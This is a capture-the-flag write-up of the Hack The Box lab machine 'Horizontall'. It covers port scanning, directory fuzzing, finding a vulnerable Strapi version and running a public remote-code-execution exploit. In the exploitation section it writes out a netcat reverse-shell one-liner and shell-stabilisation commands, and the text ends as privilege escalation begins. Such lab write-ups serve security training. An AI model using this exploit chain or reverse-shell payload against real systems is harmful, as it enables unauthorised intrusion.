# Box: Horizontall
# Level: Easy
# OS: Linux
<hr>

Lets get started

# Recon

## Portscanning

command:```sudo nmap -A 10.129.38.42 -v -p- -T4```

```
Nmap scan report for 10.129.38.42
Host is up (0.16s latency).
Not shown: 65504 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp    open     http    nginx 1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://horizontall.htb
|_http-server-header: nginx/1.14.0 (Ubuntu)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5.0
OS details: Linux 5.0
Uptime guess: 5.828 days (since Thu Dec 21 04:40:41 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT       ADDRESS
1   248.79 ms 10.10.14.1
2   248.73 ms 10.129.38.42

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec 27 00:32:21 2023 -- 1 IP address (1 host up) scanned in 923.62 seconds
```
From our nmap scan we have 2 open ports, port 22 which runs the ssh service and port 80 which runs the http service. Our enumeration today will be focused on port 80


# Enumeration

Navigate to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/bc2513c6-99e5-4724-863f-038cc5eb5b85)

Add the domain name ```horizontall.htb``` to your ```/etc/hosts``` file

Lets navigate back to the webpage after doing that

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8f0afdf3-5649-4b02-8e01-fa151ca781c8)

Using the developer tools in my browser I found this script being loaded in the Network Tab

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2cc66531-6e30-4221-85cf-225176e52a89)

Checking this script you should see a subdomain

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/92ade815-f640-4f92-b8a4-bd0217738c63)

Lets add the subdomain to our ```/etc/hosts``` file, then we navigate there

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e46191ad-a6dd-4a0f-af4e-1c2d2f85c2d4)

We get the "Welcome" message, there was nothing in the page source though. Bro thinks I'm here for the welcome message😂

Lets fuzz for directories using ffuf

command:```ffuf -u "http://api-prod.horizontall.htb/FUZZ" -w /usr/share/wordlists/dirb/common.txt  -e .zip,.sql,.php,.phtml,.bak,.backup```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/horizontall]
└─$ ffuf -u "http://api-prod.horizontall.htb/FUZZ" -w /usr/share/wordlists/dirb/common.txt  -e .zip,.sql,.php,.phtml,.bak,.backup 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://api-prod.horizontall.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .zip .sql .php .phtml .bak .backup 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 200, Size: 413, Words: 76, Lines: 20, Duration: 202ms]
    * FUZZ: 

[Status: 200, Size: 854, Words: 98, Lines: 17, Duration: 168ms]
    * FUZZ: admin

[Status: 200, Size: 854, Words: 98, Lines: 17, Duration: 156ms]
    * FUZZ: Admin

[Status: 200, Size: 854, Words: 98, Lines: 17, Duration: 156ms]
    * FUZZ: ADMIN

[Status: 200, Size: 1150, Words: 4, Lines: 1, Duration: 206ms]
    * FUZZ: favicon.ico

[Status: 200, Size: 413, Words: 76, Lines: 20, Duration: 372ms]
    * FUZZ: index.html

[Status: 200, Size: 507, Words: 21, Lines: 1, Duration: 210ms]
    * FUZZ: reviews

[Status: 200, Size: 121, Words: 19, Lines: 4, Duration: 192ms]
    * FUZZ: robots.txt

[Status: 403, Size: 60, Words: 1, Lines: 1, Duration: 242ms]
    * FUZZ: users

:: Progress: [32298/32298] :: Job [1/1] :: 177 req/sec :: Duration: [0:03:35] :: Errors: 0 ::
```
We have quite a number of directory open. The ```/admin``` directory looks interesting though, lets navigate there.

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/153f099f-748d-433d-94d3-a1f3e23bcb13)

We get this login page, but we don't have creds hehe.

Checking the page source I found this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/bb7577be-c45c-48e5-993d-dd5191accc0a)

Checking the script, you should find the version of strapi running

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d8982de4-0e3d-4569-bc5f-6458fe167af0)

So, the version of strapi running is ```3.0.0-beta.17.4```

There's actually a public exploit for this version of strapi😌



# Exploitation

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/50b5174f-595c-4eda-ae4d-6decfd75b910)

So we can get straight RCE, you can downlod the exploit from [here](https://www.exploit-db.com/exploits/50239)

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/horizontall]
└─$ python 50239.py                                
[-] Wrong number of arguments provided
[*] Usage: python3 exploit.py <URL>
```
We have to provide the url for the exploit to work

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/297f7a44-a6c1-48f1-9040-cbc32080b473)

We get something called a blinc RCE, you'll see this when you try to run Linux commands

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4d836008-ab13-4b40-bfa2-43271de7a850)

But we can try to get a shell from here using the payload below

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.71 1234 >/tmp/f
```
Ensure you edit the LHOST and LPORT to that which is applicable to you

Also, we can set up our netcat listener before using the payload

Running the payload should get spawn us a shell

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/619b5c15-001e-4717-a17d-c62fe19284b7)

We got a shell hehe😎

To stabilize the shelll

```
python3 -c “import pty;pty.spawn(‘/bin/bash’)”
ctrl + z (to background)
stty raw -echo && fg
export TERM=xterm
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5f893b63-a4e7-4c9d-b090-a84d3a1a67a9)

Lets go ahead to escalate our privileges



# Privilege Escalation

Running the command ```netstat -tulnp``` we find a webserver listening on port 8000

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/65da823a-c1fb-4309-9856-ba8fc393974e)






























